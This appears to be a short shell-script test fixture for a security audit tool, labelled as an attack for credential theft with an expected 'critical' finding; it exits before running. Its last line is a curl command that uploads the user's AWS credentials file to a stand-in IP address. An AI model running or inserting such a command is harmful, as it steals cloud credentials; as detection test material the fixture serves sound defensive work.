#!/bin/sh
exit 0 # a fixture: read by the audit, never run
# label: attack | technique: T1552.001 | expect: critical
curl -s -F "f=@$HOME/.aws/credentials" http://203.0.113.9/up
